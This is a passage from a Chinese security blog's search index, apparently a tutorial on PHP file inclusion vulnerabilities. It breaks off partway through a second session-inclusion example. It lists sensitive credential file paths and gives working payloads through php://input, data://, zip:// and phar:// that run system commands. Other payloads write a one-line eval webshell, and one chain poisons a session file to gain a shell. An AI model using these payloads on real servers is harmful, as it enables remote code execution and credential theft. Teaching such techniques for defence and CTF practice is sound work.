        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>堆叠注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2022/12/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含漏洞和文件上传漏洞还是有些相像的，但是文件包含难度要更大一些。</p>
<span id="more"></span>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p>PHP中文件包含函数主要有以下几种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require() 			文件包含过程中出现错误，抛出错误，退出程序</span><br><span class="line">require_once() 		与require()函数相同，但文件只包含第一次</span><br><span class="line">include() 			执行文件包含过程中出现错误，抛出警告，之后继续正常执行</span><br><span class="line">include_once() 		与include()函数相同，但文件只包含第一次</span><br><span class="line">highlight_file()    打印输出或者返回 filename 文件中语法高亮版本的代码</span><br></pre></td></tr></table></figure>
<p>php开启错误提醒需要配置php.ini中disaply_errors为On</p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>文件包含漏洞是一种Web漏洞 ，最常被发现会影响依赖脚本运行时的Web 应用程序。当应用程序使用攻击者控制的变量以允许攻击者控制在运行时执行哪个文件的方式构建可执行代码的路径时，会导致此问题。文件包含漏洞不同于一般的目录遍历攻击，因为目录遍历是一种获取未经授权的文件系统访问的方式，而文件包含漏洞会破坏应用程序加载代码以供执行的方式。成功利用文件包含漏洞将导致在运行受影响的 Web 应用程序的Web 服务器上远程执行代码。攻击者可以使用远程代码执行在网络服务器上创建网络外壳，用于网站篡改。</p>
<h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>文件包含函数加载的参数未经过过滤或严格的定义，可以被用户控制，包含其它恶意文件，导致执行非预期代码。<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$_GET[&#39;filename&#39;]</code><br>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改 <code>$_GET[&#39;filename&#39;]</code> 的值，执行非预期的操作。</p>
<ul>
<li>Web 应用实现了动态包含</li>
<li>动态包含的文件路径参数，客户端可控</li>
</ul>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
<li>无视文件扩展名读取文件<br>包含文件时，PHP会读取文件的源码，包括图片文件。尝试包含图片，示例如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.12.32.138/fileInclude/fileinclude.php?path=smile.jpg</span><br></pre></td></tr></table></figure></li>
<li>无条件解析PHP代码<br>文件包含在读取文件源码的同时，如果遇到符合PHP语法规范的代码，就会无条件执行。<br>例如，将info.php的后缀改为info.rar，依然能显示phpinfo()信息。<br>这也为图片木马提供了一种利用方法。</li>
</ol>
<h1 id="文件包含漏洞类型"><a href="#文件包含漏洞类型" class="headerlink" title="文件包含漏洞类型"></a>文件包含漏洞类型</h1><h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><p>当 Web 应用程序下载并执行远程文件时，会发生远程文件包含( RFI )。这些远程文件通常以HTTP或FTP URI的形式作为用户提供给 Web 应用程序的参数获取。<br>这个允许我们包含远程服务的文件并执行，需要对php.ini进行配置：</p>
<ul>
<li>allow_url_fopen &#x3D; On （默认为On）</li>
<li>allow_url_include &#x3D; On （php5.2之后默认为Off）<br>只有两个配置项都为On时才能利用</li>
</ul>
<h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h2><p>本地文件包含( LFI ) 类似于远程文件包含漏洞，只是不包含远程文件，而是只包含本地文件，即当前服务器上的文件，以便执行。这个问题仍然可以通过包含一个包含攻击者控制的数据（例如 Web 服务器的访问日志）的文件来导致远程代码执行。</p>
<h1 id="查看的敏感文件的绝对路径"><a href="#查看的敏感文件的绝对路径" class="headerlink" title="查看的敏感文件的绝对路径"></a>查看的敏感文件的绝对路径</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WINDOWS下:</span><br><span class="line">c:/boot.ini //查看系统版本</span><br><span class="line"></span><br><span class="line">c:/windows/php.ini //php配置信息</span><br><span class="line"></span><br><span class="line">c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</span><br><span class="line"></span><br><span class="line">c:/winnt/php.ini</span><br><span class="line"></span><br><span class="line">c:/winnt/my.ini</span><br><span class="line"></span><br><span class="line">C:\Windows\win.ini  //用于保存系统配置文件</span><br><span class="line"></span><br><span class="line">c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</span><br><span class="line"></span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</span><br><span class="line"></span><br><span class="line">//存储了pcAnywhere的登陆密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件</span><br><span class="line"></span><br><span class="line">c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.</span><br><span class="line"></span><br><span class="line">c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</span><br><span class="line"></span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf</span><br><span class="line"></span><br><span class="line">C:\Program Files\mysql\my.ini</span><br><span class="line"></span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LUNIX/UNIX 下:</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置</span><br><span class="line"></span><br><span class="line">/etc/sysconfig/iptables //从中得到防火墙规则策略</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf // apache配置文件</span><br><span class="line"></span><br><span class="line">/etc/rsyncd.conf //同步程序配置文件</span><br><span class="line"></span><br><span class="line">/etc/my.cnf //mysql的配置文件</span><br><span class="line"></span><br><span class="line">/etc/redhat-release //系统版本</span><br><span class="line"></span><br><span class="line">/etc/issue</span><br><span class="line"></span><br><span class="line">/etc/issue.net</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line"></span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line"></span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line"></span><br><span class="line">/etc/sysconfig/iptables 查看防火墙策略</span><br></pre></td></tr></table></figure>

<h1 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h1><p>下面例子中测试代码均为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$file</span>;</span><br></pre></td></tr></table></figure>
<p>allow_url_fopen 默认为 On<br>allow_url_include 默认为 Off<br>若有特殊要求，会在利用条件里指出。</p>
<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。<br>PHP伪协议事实上就是支持的协议与封装协议（12种）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line"></span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line"></span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line"></span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， </span><br><span class="line">内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br><span class="line"></span><br><span class="line">zlib:// — 压缩流</span><br><span class="line"></span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line"></span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line"></span><br><span class="line">phar:// — PHP 归档</span><br><span class="line"></span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line"></span><br><span class="line">rar:// — RAR</span><br><span class="line"></span><br><span class="line">ogg:// — 音频流</span><br><span class="line"></span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><figure class="highlight plaintext"><figcaption><span>伪协议用于访问本地文件系统</span></figcaption><table><tr><td class="code"><pre><span class="line">**利用条件：**</span><br><span class="line">* 对allow_url_include不做要求</span><br><span class="line">* 对allow_url_fopen不做要求</span><br><span class="line">**示例**</span><br></pre></td></tr></table></figure>
<p>fileinclude.php?file&#x3D;file:&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### php://input</span><br><span class="line">可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。</span><br></pre></td></tr></table></figure>
<p>enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**利用条件：**</span><br><span class="line">* allow_url_include = On。</span><br><span class="line">* allow_url_fopen不做要求。</span><br><span class="line">**示例**</span><br></pre></td></tr></table></figure>
<p>fileinclude.php?file&#x3D;php:&#x2F;&#x2F;input</p>
<p>POST:<br><?php phpinfo(); ?></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**注意：**</span><br><span class="line">碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。</span><br><span class="line">file_get_contents()：这个函数就是把一个文件里面的东西 （字符）全部return出来作为字符串。</span><br><span class="line">除此之外，这个函数如果直接把字符串当作参数会报错，但如果包含的是http协议的网址，则会像curl命令一样，把源码读出来。而php伪协议也是识别http协议的，所以说上面php://input可以将POST的数据读过来来赋值给参数。</span><br><span class="line">**测试代码：**</span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">    echo file_get_contents(&quot;php://input&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="php-x2F-x2F-input（命令执行）"><a href="#php-x2F-x2F-input（命令执行）" class="headerlink" title="php:&#x2F;&#x2F;input（命令执行）"></a>php:&#x2F;&#x2F;input（命令执行）</h3><p><strong>利用条件：</strong><br>allow_url_include:On<br>allow_url_fopen 不做要求<br><strong>示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinlcude.php?file=php://input</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">&lt;?php system(&#x27;whoami&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="php-x2F-x2F-input（写入木马）"><a href="#php-x2F-x2F-input（写入木马）" class="headerlink" title="php:&#x2F;&#x2F;input（写入木马）"></a>php:&#x2F;&#x2F;input（写入木马）</h3><p><strong>利用条件：</strong><br>allow_url_include:On<br>allow_url_fopen 不做要求<br><strong>示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?php://input</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">&lt;?php fputs(fopen(&#x27;hack.php&#x27;,&#x27;w&#x27;), &#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;) ;?&gt;</span><br></pre></td></tr></table></figure>
<p>执行完后，同目录下就生成了一句话木马。用shell管理工具，比如蚁剑等便能成功连接。</p>
<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>元封装器，设计用于<strong>数据流打开</strong>时的<strong>筛选过滤</strong>应用，对本地磁盘文件进行读写。<br><strong>利用条件：</strong><br>allow_url_include 不做要求<br>allow_url_fopen 不做要求<br><strong>示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=php://filter/read=convert-encode/resource=index.php</span><br><span class="line"></span><br><span class="line">另一种 fileinclude.php?file=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">//效果和前一种相同，少了read等关键字，在绕过一些waf时也许有用</span><br></pre></td></tr></table></figure>
<p>通过指定末尾的文件，可以读取经过base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也比较大</p>
<h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>phar:&#x2F;&#x2F; 就是php解压缩包的一个伪协议，不管后缀是什么，都会当作压缩包来解压。<br><strong>利用条件：</strong><br>php版本大于等于5.3.0<br>对allow_url_include不做要求<br>对allow_url_fopen不做要求<br><strong>示例</strong><br>写一个文件phpinfo.php，其内容为<?php phpinfo(); ?>，打包成zip压缩文件格式的压缩包，如下：<br><img src="/simg/File_include.png" alt=" "><br>指定绝对路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=phar://D:/phpstudy/WWW/test.zip/phpinfo.php</span><br></pre></td></tr></table></figure>
<p>或者使用相对路径（这里test.zip就在当前目录下，和fileinclude.php同一目录）:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=phar://test.zip/phpinfo.php</span><br></pre></td></tr></table></figure>
<p>先访问url地址，然后马儿就写进去了。<br>然后用shell管理工具，将上面两个的url地址随便选一个，填写到shell管理工具的url地址里，比如蚁剑等便能成功连接。<br><strong>注意：</strong><br>其中test.zip必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过test.zip的后缀可以不是zip，可以是像test.jpg，甚至test.111这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为test.111这样的后缀肯定不会被拦截了，这时就能成功。</p>
<h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>zip伪协议与phar伪协议类似，但是用法不同。<br><strong>利用条件：</strong><br>php版本大于等于php5.3.0<br>对allow_url_include不做要求。<br>对allow_url_fopen不做要求。<br><strong>方式</strong><br>构造zip包的方法同phar：<br>写一个文件phpinfo.php，其内容为<?php phpinfo(); ?>，打包成zip压缩文件格式的压缩包<br>但是使用zip伪协议，需要指定绝对路径，而且压缩包文件和压缩包内的文件之间得用#，还要将#给URL编码为%23，之后填上压缩包内的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=zip://D:/phpStudy/WWW/test.zip%23phpinfo.php</span><br></pre></td></tr></table></figure>
<p>若是使用相对路径，则会文件包含失败。<br>这里需要注意的和phar:&#x2F;&#x2F;中的注意一样，其中test.zip必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过test.zip的后缀可以不是zip，可以是像test.jpg，甚至test.111这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为test.111这样的后缀肯定不会被拦截了，这时就能成功。</p>
<h3 id="zip-x2F-x2F-命令执行"><a href="#zip-x2F-x2F-命令执行" class="headerlink" title="zip:&#x2F;&#x2F;(命令执行)"></a>zip:&#x2F;&#x2F;(命令执行)</h3><p><strong>利用条件：</strong><br>php版本大于等于php5.3.0<br>对allow_url_include不做要求。<br>对allow_url_fopen不做要求。<br><strong>方式</strong><br>同zip:&#x2F;&#x2F;，只不过把文件内容改成<?php system('whoami');?></p>
<h3 id="zip-x2F-x2F-（写入木马）"><a href="#zip-x2F-x2F-（写入木马）" class="headerlink" title="zip:&#x2F;&#x2F;（写入木马）"></a>zip:&#x2F;&#x2F;（写入木马）</h3><p><strong>利用条件：</strong><br>php版本大于等于php5.3.0<br>对allow_url_include不做要求。<br>对allow_url_fopen不做要求。<br><strong>方式：</strong><br>构造zip包的方法同phar。<br>写一个木马shell.php，其内容为<?php @eval($_POST[v]);?>，打包成zip压缩文件格式的压缩包。<br>但是使用zip伪协议，需要指定绝对路径，而且压缩包文件和压缩包内的文件之间得用#，还要将#给URL编码为%23，之后填上压缩包内的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.4/fileinclude.php?file=zip://D:/phpStudy/PHPTutorial/WWW/test.zip%23shell.php</span><br></pre></td></tr></table></figure>
<p>先访问该url地址，然后小马就写进去了。<br>若是使用相对路径，则会getshell失败。<br>注意：<br>这里需要注意的和phar:&#x2F;&#x2F;中的注意一样，其中test.zip必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过test.zip的后缀可以不是zip，可以是像test.jpg，甚至test.111这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为test.111这样的后缀肯定不会被拦截了，这时就能成功。</p>
<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>数据流封装器，和php:&#x2F;&#x2F;相似，都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。<br><strong>利用条件：</strong><br>php版本大于等于php5.2<br>allow_url_fopen &#x3D; On<br>allow_url_include &#x3D; On<br>方式一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>方式二：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line">PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt;。其中加号+的url编码为%2b。如果不手动url编码会报错：Parse error: syntax error, unexpected &#x27;?&#x27; in data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8 on line 1</span><br></pre></td></tr></table></figure>

<h3 id="data-x2F-x2F-（命令执行）"><a href="#data-x2F-x2F-（命令执行）" class="headerlink" title="data:&#x2F;&#x2F;（命令执行）"></a>data:&#x2F;&#x2F;（命令执行）</h3><p><strong>利用条件：</strong><br>同上<br>方式一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<p>方式二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br><span class="line">其中PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==的base64解码为：&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="data-x2F-x2F-（写入木马）"><a href="#data-x2F-x2F-（写入木马）" class="headerlink" title="data:&#x2F;&#x2F;（写入木马）"></a>data:&#x2F;&#x2F;（写入木马）</h3><p><strong>利用条件：</strong><br>同上<br>方式一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain, &lt;?php fputs(fopen(&#x27;hack.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
<p>用shell管理工具，比如蚁剑等便能成功连接。<br>方式二：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=data:text/plain;base64,PD9waHAgZnB1dHMoZm9wZW4oJ2hhY2sucGhwJywndycpLCc8P3BocCBAZXZhbCgkX1BPU1Rbdl0pPz4nKTs/Pg==</span><br><span class="line">其中PD9waHAgZnB1dHMoZm9wZW4oJ2hhY2sucGhwJywndycpLCc8P3BocCBAZXZhbCgkX1BPU1Rbdl0pPz4nKTs/Pg==的base64解码为：&lt;?php fputs(fopen(&#x27;hack.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>


<h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p><strong>利用条件：</strong><br>session文件路径已知，且其中内容部分可控。<br><strong>方式：</strong><br>php的session文件保存路径可以在phpinfo的session.save_path看到<br><img src="/simg/File_include_2.png" alt=" "><br>第二列是Local Value（局部变量），第三列是Master Value（主变量）。其中Master Value是PHP.ini文件中的内容。Local value是当前目录中的设置，这个值会覆盖Master Value中对应的值。所以看的是第二列当前目录中的设置D:\phpStudy\PHPTutorial\tmp\tmp。<br>常见的php-session存放位置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br><span class="line">session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。</span><br></pre></td></tr></table></figure>
<p><img src="/simg/File_include_3.png" alt=" "><br>要包含并利用的话，需要能控制部分session文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
<ul>
<li><strong>例子1：</strong><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第3行</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 第8行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第20行</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$res_password</span>);</span><br><span class="line"><span class="comment"># 第24行</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res_password</span> == <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br></pre></td></tr></table></figure>
这里使用了session来保存用户会话:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 会将会话中的数据设置到 $_SESSION 变量中。</span><br><span class="line">当 PHP 停止的时候，它会自动读取 $_SESSION 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</span><br><span class="line">对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</span><br><span class="line">考虑到变量$username是我们可控的，并且被设置到了$_SESSION中，因此我们输入的数据未经过滤的就被写入到了对应的sessioin文件中。结合前面的php文件包含，可以推测这里可以包含session文件。</span><br><span class="line">要包含session文件，需要知道文件的路径。先注册一个用户，比如Johnson。等登陆成功后，记录下cookie中的PHPSESSID的值，这里为0d0385dc6a1067f4e3406191（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，名称都为sess_cookie值）</span><br></pre></td></tr></table></figure>
访问：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://x.x.x.x/index.php?action=/var/lib/php5/sess_0d0385dc6a1067f4e3406191</span><br></pre></td></tr></table></figure>
其中&#x2F;var&#x2F;lib&#x2F;php5&#x2F;的session文件路径是测试出来的，常见的php-session存放位置在上面也有列出来了。<br>这里能包含，并且控制session文件，但要写入可用的payload，还需要绕过：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$username</span>);</span><br></pre></td></tr></table></figure>
如前面所示，输入的用户名会被base64加密。如果直接用php伪协议来解密整个session文件，由于序列化的前缀，肯定会导致乱码。<br>那么这里需要考虑一下base64的编码过程。比如编码abc。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">未编码: abc</span><br><span class="line">转成ascii码： 97 98 99</span><br><span class="line">转成对应二进制（三组，每组8位）： 01100001 01100010 01100011</span><br><span class="line">重分组（四组，每组6位）： 011000 010110 001001 100011</span><br><span class="line">每组高位补零，变为每组8位：00011000 00010110 00001001 00100011</span><br><span class="line">每组对应转为十进制： 24 22 9 35</span><br><span class="line">查Base64编码表得： Y W J j</span><br></pre></td></tr></table></figure>
也就是说，当对session文件进行base64解密时，前16个字符固然被解密为乱码，但不会再影响从第17个字符后的部分也就是base64加密后的username。</li>
</ul>
<p>那么这里注册一个账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnson&lt;?php eval($_GET[&#x27;abcdefg&#x27;]) ?&gt;,其base64加密后的长度为128，大于100。（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，名称都为sess_cookie值）</span><br><span class="line"></span><br><span class="line">访问：http://x.x.x.x/index.php</span><br><span class="line">?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_0d0385dc6a1067f4e3406191</span><br><span class="line">&amp;abcdefg=phpinfo();</span><br><span class="line"></span><br><span class="line">成功执行，即成功getshell了</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>例子2：</strong><br>现在有一个session.php可控用户会话信息值：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br></pre></td></tr></table></figure>
